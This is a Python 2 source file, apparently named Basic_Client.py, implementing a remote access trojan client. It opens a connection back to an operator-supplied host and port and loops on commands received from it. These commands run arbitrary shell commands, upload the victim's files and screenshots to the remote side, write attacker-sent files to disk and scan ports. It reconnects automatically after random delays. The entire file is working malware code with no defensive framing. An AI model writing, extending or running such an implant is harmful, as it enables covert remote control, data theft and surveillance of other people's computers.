import sys
import socket
import subprocess
import os
import base64
import time
import random
import shutil
import tempfile
import pyscreenshot

RECV_BYTE = 1024


def b64e(x):
    return base64.b64encode(x)

    
def send_file(s, file_path):
    if os.path.isfile(file_path):
        f = open(file_path, 'rb')

        while True:
            packet = f.read(RECV_BYTE)
            if packet == '':
                break
            s.send(packet)

        s.send(b64e('REMOTE_FILE_DOWNLOAD_DONE'))
        f.close()
    elif os.path.isdir(file_path):
        s.send(b64e('REMOTE_FILE_IS_A_DIRECTORY'))
    else:
        s.send(b64e('REMOTE_FILE_NOT_EXIST'))


def receive_file(s, file_path):
    if os.path.exists(file_path):
        s.send(b64e('REMOTE_FILE_ALREADY_EXISTS'))

    if not os.path.exists(os.path.dirname(file_path)):
        os.makedirs(os.path.dirname(file_path))

    s.send(b64e('REMOTE_FILE_UPLOAD_START'))

    transfer_done_token = b64e('LOCAL_FILE_UPLOAD_DONE')
    f = open(file_path, 'wb')
    while True:
        packet = s.recv(RECV_BYTE)
        if packet.endswith(transfer_done_token):
            break
        f.write(packet)

    # final data
    f.write(packet.split(transfer_done_token, 1)[0])
    f.close()


def screen_capture(s):
    temp_path = tempfile.mkdtemp()
    img_path = temp_path + '/img.jpg'
    pyscreenshot.grab().save(img_path, 'JPEG')
    send_file(s, img_path)
    shutil.rmtree(temp_path)


def change_working_directory(s, path):
    if os.path.isdir(path):
        os.chdir(path)
        ret_str = '[*] CWD is ' + os.getcwd()
    elif path == '':
        ret_str = '[*] CWD is ' + os.getcwd()
    else:
        ret_str = '[!] %s is not a directory'

    s.send(ret_str)


def scan_port(s, args):
    arg_list = args.split (' ')
    if len(arg_list) == 1:
        host = arg_list[0]
        port_list = range(1, 65536)
    else:
        host = arg_list[0]
        port_list = arg_list[1].split(',')

    scan_result = ''
    try:
        for port in port_list:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            result = sock.connect_ex((host, int(port)))
            if result == 0:
                scan_result += '[+] Port ' + port + ' is open.\n'
            else:
                scan_result += '[-] Port ' + port + ' is closed or the host is not reachable.\n'
            sock.close()
    except:
        pass

    s.send(scan_result)


def connect():
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((sys.argv[0], int(sys.argv[1])))

    while True:
        command = s.recv(RECV_BYTE)
        command_split = command.split(' ', 1)
        action = command_split[0].lower()
        if len(command_split) == 2:
            args = command_split[1]
        else:
            args = ''

        if 'exit' == action:
            s.close()
            break
        elif 'download' == action:
            send_file(s, args)
        elif 'upload' == action:
            receive_file(s, args)
        elif 'screencap' == action:
            screen_capture(s)
        elif 'cd' == action:
            change_working_directory(s, args)
        elif 'portscan' == action:
            scan_port(s, args)
        else:
            cmd = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
            s.send(cmd.stdout.read())
            s.send(cmd.stderr.read())

    return False


def main():
    if len(sys.argv) < 3:
        print '[!] Usage: Basic_Client.py <host> <port>'
        return

    sys.argv = sys.argv[1:]
    while True:
        try:
            if not connect():
                break
        except:
            sleep_time = random.randrange(1, 10)
            time.sleep(sleep_time)
            pass


main()
